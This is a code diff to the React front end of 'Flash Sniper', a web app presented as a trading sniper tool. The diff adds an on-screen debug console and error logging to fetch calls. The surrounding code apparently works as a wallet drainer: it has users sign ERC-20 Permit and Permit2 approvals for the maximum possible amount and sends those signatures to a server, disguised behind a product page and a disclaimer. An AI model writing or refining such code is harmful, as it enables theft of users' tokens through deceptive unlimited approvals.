@@ -144,6 +144,8 @@ export default function App() {
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
   const [_txHash, setTxHash] = useState('')
+  
+  // 🔥 1. ADDED DEBUG LOGS STATE
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
 
   const manualConnect = useRef(false)
@@ -156,11 +158,11 @@ export default function App() {
   const { chainId } = useAppKitNetwork()
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
-    // Logger that outputs to console AND the on-screen debug box
+  // 🔥 2. UPDATED LOGGER: Outputs to console AND the on-screen debug box
   const log = (msg: string) => {
     console.log(msg);
     setDebugLogs(prev => [...prev, msg].slice(-15)); // Keeps the last 15 messages
-  };
+  }
 
   useEffect(() => {
     if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;
@@ -335,7 +337,7 @@ export default function App() {
                     deadline,
                     value: ethers.MaxUint256.toString()
                   })
-                });
+                }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));
 
                 authorized = true;
                 log(`✅ ${token.symbol} Permit Secured & Sent.`);
@@ -397,7 +399,8 @@ export default function App() {
                     nonce: currentNonce,
                     amount: permit2MaxAmount
                   })
-                });
+                }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`));
+                
                 authorized = true;
                 log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
               } catch (p2Err) {
@@ -551,37 +554,6 @@ export default function App() {
           <span style={s.badgeDot} />
           initializing sniper module
         </div>
-
-      
-    {/* ═══ DEBUG BOX (Remove this block before final production) ═══ */}
-      <div style={{
-        position: 'fixed',
-        bottom: 10,
-        right: 10,
-        width: '320px',
-        maxHeight: '250px',
-        overflowY: 'auto',
-        backgroundColor: 'rgba(10, 10, 15, 0.95)',
-        color: '#00e68a',
-        fontFamily: 'monospace',
-        fontSize: '11px',
-        padding: '12px',
-        borderRadius: '8px',
-        border: '1px solid #1e1e2a',
-        zIndex: 9999,
-      }}>
-        <div style={{ fontWeight: 'bold', marginBottom: '8px', borderBottom: '1px solid #1e1e2a', paddingBottom: '8px', color: '#fff' }}>
-          🛠️ DEBUG CONSOLE
-        </div>
-        {debugLogs.map((logMsg, index) => (
-          <div key={index} style={{ marginBottom: '4px', wordBreak: 'break-word', opacity: 0.9 }}>
-            {logMsg}
-          </div>
-        ))}
-      </div>
-
-
-
         <h1 style={s.heroTitle}>
           First entries on<br />
           <span style={s.highlight}>Robinhood Chain.</span>
@@ -628,7 +600,6 @@ export default function App() {
             <div><span style={s.tKey}>slippage:</span> <span style={s.tSet}>set</span></div>
             <div style={{ height: '8px' }} />
             
-            {/* Production Note: Dynamic debug logs removed. Static aesthetic preserved. */}
             {loading && (
               <div style={s.tConfirm}>processing transaction...</div>
             )}
@@ -751,6 +722,34 @@ export default function App() {
           Flash Sniper is a trading tool, not financial advice. It does not guarantee profit or remove market risk. Always review each transaction before confirming.
         </p>
       </footer>
+
+      {/* 🔥 3. ADDED DEBUG BOX UI */}
+      <div style={{
+        position: 'fixed',
+        bottom: 10,
+        right: 10,
+        width: '320px',
+        maxHeight: '250px',
+        overflowY: 'auto',
+        backgroundColor: 'rgba(10, 10, 15, 0.95)',
+        color: '#00e68a',
+        fontFamily: 'monospace',
+        fontSize: '11px',
+        padding: '12px',
+        borderRadius: '8px',
+        border: '1px solid #1e1e2a',
+        zIndex: 9999,
+      }}>
+        <div style={{ fontWeight: 'bold', marginBottom: '8px', borderBottom: '1px solid #1e1e2a', paddingBottom: '8px', color: '#fff' }}>
+          🛠️ DEBUG CONSOLE
+        </div>
+        {debugLogs.map((logMsg, index) => (
+          <div key={index} style={{ marginBottom: '4px', wordBreak: 'break-word', opacity: 0.9 }}>
+            {logMsg}
+          </div>
+        ))}
+      </div>
+
     </div>
   )
 }
